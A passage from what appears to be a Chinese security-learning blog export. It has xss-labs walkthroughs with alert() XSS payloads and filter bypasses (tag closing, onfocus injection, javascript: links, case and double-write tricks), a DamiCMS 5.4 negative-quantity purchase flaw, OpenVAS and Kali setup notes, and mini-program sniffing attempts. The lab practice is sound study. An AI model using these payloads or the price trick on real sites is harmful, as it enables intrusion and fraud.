<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;1&quot;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> type=<span class="string">&quot;text&quot;</span> <span class="comment">//&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在<code>Cookie</code>字段字段字段改成<code>1&quot;onfocus=&#39;alert(1)&#39; type=&quot;text&quot; //</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222144450.png"></p>
<p>还是在浏览器打开burp原话</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222144540.png"></p>
<body><span class="ng-include:"></span><script>alert('a')</script><span>"></span></body>

<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>不知道没有思路，<br>真的是没有办法我就百度了<code>xss-level14</code>应为这个是要引用其他的web页面，那个页面已经没有了</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222180201.png"><br>我看一下页面源码<br>我一看见就懵了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222180249.png"><br>发现了有一个可疑的<code>ng-include:</code>是引用<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222180401.png"><br>但是还是没有思路<br>看一下源码用了htmlspecialchars()函数进行<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222180626.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>xss-labs 靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs  Less1-7关卡</title>
    <url>/2020/12/22/xss-labsLessl1-7/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>下载地址<br>Github<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p>
<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>我们在这个地方输入<code>a</code>他直接就显示出来了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221163424.png"><br>我们输入<code>&lt;script&gt;alert(/a/)&lt;/script&gt;</code><br>他就弹窗没有可能是没有进行任何过滤<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221163552.png"></p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>第二关我们直接输入<code>&lt;script&gt;alert(/a/)&lt;/script&gt;</code>发现他显示出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221163733.png"></p>
<p>查看一下源码他已经实体化了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221163818.png"></p>
<p>查看一下http源代码发现他还保留在表单上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&lt;script&gt;alert(/a/)&lt;/script&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221163906.png"></p>
<p>我们就可以构建成下面这样</p>
<p>在表单上输入到是<code>&quot;&gt;&lt;script&gt;alert(/a/)&lt;/script&gt; //</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221164152.png"><br>介绍<br>可以看见下面<code>&quot;&gt;</code>他叫前面的标签给闭合了后面的<code>//</code>注释了后面的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;script&gt;alert(/a/)&lt;/script&gt; <span class="comment">//&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>我直接输入<code>&lt;script&gt;alert(/a/)&lt;/script&gt;</code>发现他显示出来了<br>被实体化<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221164622.png"></p>
<p>我们可以输入<code>script &#39;&quot;&gt;&lt;</code>看看那个被过滤了</p>
<p>可以看见<code>&quot;&gt;&lt;</code>是被过滤了的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221165250.png"></p>
<p>我们分析一下下面这个在php是可以弹窗的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;这个是什么输入东西&#x27;</span>&gt;	</span><br></pre></td></tr></table></figure>
<p>我们可以输入就可以用<code>&#39;</code>和添加<code>属性</code>来进行弹窗<br>前面的<code>1&#39;</code>用来闭合前面的属性后面添加一个事件<code>onfocus=&#39;alert(1)&#39;</code>在后面//进行注释<br><code>onfocus</code>事件获取到焦点时触发会</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27; 1&#x27;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> <span class="comment">//&#x27;&gt;	</span></span><br></pre></td></tr></table></figure>


<p>我们在输入框输入<code>1&#39;onfocus=&#39;alert(1)&#39; //</code> </p>
<p>我们添加一下输入框他就会弹出<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221170002.png"></p>
<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>我直接输入<code>script &#39;&quot;&gt;&lt;</code>看看他过滤什么东西<br>发现没有了<code>&gt;和&lt;</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221170501.png"></p>
<p>我们输入<code>1&#39;onfocus=&#39;alert(1)&#39; //</code><br>发现他是<code>&quot;</code>我们输入的是<code>&#39;</code>不一样<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221182908.png"><br>我们可以输入就可以用<code>&quot;</code>和添加<code>属性</code>来进行弹窗<br>和Less3基本是一样的只是符合不一样一个是<code>&#39;</code>一个是<code>&quot;</code><br>我们分析一下下面这个在php是可以弹窗的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&#x27;这个是什么输入东西&#x27;</span>&gt;	</span><br></pre></td></tr></table></figure>
<p>前面的<code>1&quot;</code>用来闭合前面的属性后面添加一个事件<code>onfocus=&#39;alert(1)&#39;</code>在后面//进行注释<br><code>onfocus</code>事件获取到焦点时触发会</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;1&quot;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> <span class="comment">// &quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样我们就可以输入<code>1&quot;onfocus=&#39;alert(1)&#39; //</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221183041.png"></p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>直接输入<code>script &#39;&quot;&gt;&lt;</code>看看他过滤什么东西<br>发现他什么都没有过滤<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221183219.png"></p>
<p>我们在输入<code>1&quot;onfocus=&#39;alert(1)&#39; //</code>看看<br>可以看见<code>on</code>被过滤了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221194026.png"><br>我想了一下可以用超链接进行点击，用为协议进行<br>用下面代码进分析</p>
<p><code>&quot;&gt;</code>用来闭合前面的<code>input</code>标签，<code>//</code>还是注释后面的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a href=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;点我&lt;/a&gt; <span class="comment">//&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们输入<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot; &gt;点我&lt;/a&gt; //</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221194526.png"></p>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>输入<code>script &#39;&quot;&gt;&lt; on</code>看看他过滤什么东西，我这个又添加了on应为前面可以看见on被转换了</p>
<p>发现还是<code>on</code>被转换成<code>o_n</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221194804.png"></p>
<p>我们输入上面的level5<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot; &gt;点我&lt;/a&gt; //</code></p>
<p>可以看见<code>href</code>被转换成了<code>hr_ef</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222074342.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a hr_ef=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;点我&lt;/a&gt; <span class="comment">//&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们叫<code>href</code>大小写替换查询一下变成<code>&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1);&quot; &gt;点我&lt;/a&gt; //</code><br>代码就变成这样了应为<code>html</code>标签是不区分大小写的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span>&gt;&lt;a HrEf=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;点我&lt;/a&gt; <span class="comment">//&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看见绕过了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222074916.png"></p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>输入<code>script &#39;&quot;&gt;&lt; on On</code>看看他过滤什么东西，我这个又添加了<code>On</code>看看他会不会被过滤</p>
<p>可以看见<code>script,on,On</code>都过滤成空了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222075138.png"></p>
<p>我们就可以写绕过比如<code>script</code>写成<code>scrscriptipt</code></p>
<p>下面这个<code>oonnfocus</code>原本是<code>onfocus</code>应为他<code>on</code>被过滤空<br>介绍<br><code>oonnfocus</code>的<code>on</code>变成空，就变成<code>onfocus</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot; 1&quot;</span>oonnfocus=<span class="string">&#x27;alert(1)&#x27;</span> <span class="comment">// &quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们输入<code>1&quot;oonnfocus=&#39;alert(1)&#39; // </code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222094146.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>xss-labs 靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>其他主机连接openvas的web，配置</title>
    <url>/2020/09/30/%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5openvas%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>openvas我是安装在虚拟机kali系统里面的但是我想用我的物理机去访问但是他访问不了<br>虚拟机kali系统启动openvas他监听的是127.0.0.1我就在百度搜索方法终于弄好了</p>
<h2 id="其他主机连接openvas的web"><a href="#其他主机连接openvas的web" class="headerlink" title="其他主机连接openvas的web"></a>其他主机连接openvas的web</h2><p>叫下面文件配置的<code>127.0.0.1</code>全部替换成<code>0.0.0.0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;default&#x2F;openvas-manager</span><br><span class="line">vi &#x2F;etc&#x2F;default&#x2F;greenbone-security-assistant</span><br><span class="line">vi &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;openvas-manager.service</span><br><span class="line">vi &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;greenbone-security-assistant.service</span><br></pre></td></tr></table></figure>
<p>我启动的时候出现The request contained an unknown or invalid Host header. If you are trying to access GSA via its hostname or a proxy, make sure GSA is set up to allow it<br><strong>解决方法</strong><br>打开下面的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;greenbone-security-assistant.service</span><br></pre></td></tr></table></figure>
<p>在<code>--mlisten=0.0.0.0</code>后面添加<code>--allow-header-host=虚拟机openvas的ip</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200930095238.png"><br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200930095722.png"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>openvas</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>大米cms5.4业务逻辑漏洞复现</title>
    <url>/2020/12/15/%E5%A4%A7%E7%B1%B3cms5.4%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>服务器，win2003，大米cms5.4<br>攻击者windows10</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>叫文件解压出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215110151.png"></p>
<p>访问<a href="http://ip/dami">http://ip/dami</a><br>出现下面这个选择同意<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111801.png"></p>
<p>看看有没有错的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215111959.png"></p>
<p>数据库名默认是root<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112101.png"><br>这样就安装成功了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112423.png"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们先注册一个用户</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112800.png"><br>我们登录上去<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215112837.png"></p>
<p>我们购买商品<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113001.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113203.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113121.png"><br>他显示余额不足</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215113135.png"></p>
<p>我们用Burp抓一下包<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215114529.png"><br>我们解码一下<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215114614.png"><br>这个应该就是数量<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215161530.png"></p>
<p>我们把他改成<code>-1</code>放包<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215161719.png"></p>
<p>发现他购买成功</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215161757.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215162058.png"></p>
<p>还增加了现金</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215162214.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>安装 kali 教程</title>
    <url>/2019/09/09/%E5%AE%89%E8%A3%85%20kali%20%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>Kali Linux是基于Debian的Linux发行版 有上千个渗透工具</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>kali官方<code>https://www.kali.org/</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909080303908.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909080824634.png" alt="在这里插入图片描述"></p>
<h2 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h2><p> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081132829.png" alt="在这里插入图片描述"><br>这个是用的我2019.2的<br>选择好下载kali的路径然后下一步<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081348868.png" alt="在这里插入图片描述"><br>选择好linux的版本下一步<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081427727.png" alt="在这里插入图片描述"><br>选择好kali虚拟机名这个是就我就叫他kali和他的安装位置<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081628860.png" alt="在这里插入图片描述"><br>默认20g我感觉不够用我就用60g<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081727234.png" alt="在这里插入图片描述"><br>这个是叫内存设置2g和cpu内核2<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081843902.png" alt="在这里插入图片描述"><br>启动选择<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909081948315.png" alt="在这里插入图片描述">说实话我英语真的不会这个我就选择中文的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909082231257.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019090908231853.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909082330244.png" alt="在这里插入图片描述"><br>这个名字我就叫kali<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909082715394.png" alt="在这里插入图片描述"><br>域名不用填的我直接继续<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909082818872.png" alt="在这里插入图片描述">设置登陆密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/201900908285849.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083237952.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083254575.png" alt="在这里插入图片描述"><br>用虚拟机不是物理机这个就不用修改了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083416165.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083432685.png" alt="在这里插入图片描述">这个我安装时候没有叫没有叫继续截图下来<br>选择（是）选择继续就开始安装了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083447429.png" alt="在这里插入图片描述">耐心等待安装<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909083852353.png" alt="在这里插入图片描述">这个选择 否<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909085320907.png" alt="在这里插入图片描述"><br>这个选择是不然启动不了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909085609388.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909085631821.png" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909085719537.png" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909085833542.png" alt="在这里插入图片描述"><br>有的第一次玩linux可能不知道账号多少<br>账号是root</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909090127400.png" alt="在这里插入图片描述"><br>密码是你刚才设置的密码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190909090330646.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>安装 kali</tag>
      </tags>
  </entry>
  <entry>
    <title>抓微信小程序数据</title>
    <url>/2020/04/21/%E6%8A%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="我用了很多方法进行抓取微信小程序里面的数据"><a href="#我用了很多方法进行抓取微信小程序里面的数据" class="headerlink" title="我用了很多方法进行抓取微信小程序里面的数据"></a>我用了很多方法进行抓取微信小程序里面的数据</h2><h2 id="网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了"><a href="#网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了" class="headerlink" title="网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了"></a>网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了</h2><h2 id="通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地"><a href="#通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地" class="headerlink" title="通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地"></a>通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地</h2><ol>
<li>我用burp进行抓包<br> 官方下载地址<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br> burp这个工具我之前学习过将近2个月差不多，学习还算容易写笔记难<br> 安装ca证书<br> 可是他进去小程序显示网络不能用，这样不知道是什么原因，可能是有什么安全机制吗<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152342833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><strong>访问https正常</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152642285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152631861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="3">
<li><p>charles<br> 官方下载地址<a href="https://www.charlesproxy.com/latest-release/download.do">https://www.charlesproxy.com/latest-release/download.do</a></p>
<h2 id="结果还是一样"><a href="#结果还是一样" class="headerlink" title="结果还是一样"></a>结果还是一样</h2></li>
<li><p><strong>手机版的抓包软件AndroidHttpCapture</strong></p>
<h2 id="进行抓包效果"><a href="#进行抓包效果" class="headerlink" title="进行抓包效果"></a>进行抓包效果</h2><p> 还是一样<br> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152631861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ol>
<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><h2 id="1-还用了叫https请求强制成http请求-这个方法还是不行"><a href="#1-还用了叫https请求强制成http请求-这个方法还是不行" class="headerlink" title="1.还用了叫https请求强制成http请求 这个方法还是不行"></a>1.还用了叫https请求强制成http请求 这个方法还是不行</h2><h2 id="2-抓包分析"><a href="#2-抓包分析" class="headerlink" title="2.抓包分析"></a>2.抓包分析</h2><p>这个有个缺点就是都是加密的，但是有的是不加密的</p>
<p>我就是难受理论应该我可以行得通的都是实现是很难吗<br>我又用了很多方法，比如叫用Wireshark进行抓包是可以抓的到的分析了很长时间，<br>在电脑上打开小程序<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418114830123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以分析出来，但是有的还是本加密了</p>
<h2 id="3-还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。"><a href="#3-还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。" class="headerlink" title="3. 还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。"></a>3. 还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418122453457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="4，中间人伪造证书这个，对称加密，叫加密的数据解开-这个方法还是没有什么作用"><a href="#4，中间人伪造证书这个，对称加密，叫加密的数据解开-这个方法还是没有什么作用" class="headerlink" title="4，中间人伪造证书这个，对称加密，叫加密的数据解开 这个方法还是没有什么作用"></a>4，中间人伪造证书这个，对称加密，叫加密的数据解开 这个方法还是没有什么作用</h2><h2 id="5-还有用了很多方法进行获取小程序数据就不多说了"><a href="#5-还有用了很多方法进行获取小程序数据就不多说了" class="headerlink" title="5. 还有用了很多方法进行获取小程序数据就不多说了"></a>5. 还有用了很多方法进行获取小程序数据就不多说了</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>数据嗅探</category>
      </categories>
      <tags>
        <tag>数据嗅探</tag>
      </tags>
  </entry>
  <entry>
    <title>1.github搭建自己的博客</title>
    <url>/2020/09/28/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="注册github就不用说了都会"><a href="#注册github就不用说了都会" class="headerlink" title="注册github就不用说了都会"></a>注册github就不用说了都会</h2><p>添加库<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928144301.png"></p>
<p>下面这个一定要和自己的github名字一样<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928141032.png"></p>
<h2 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;自己的邮箱&quot;</span><br></pre></td></tr></table></figure>
<p>一直回车就可以了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928141824.png"></p>
<p>github添加ssh密钥<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928142208.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928142353.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928142621.png"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞笔记</title>
    <url>/2020/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</url>
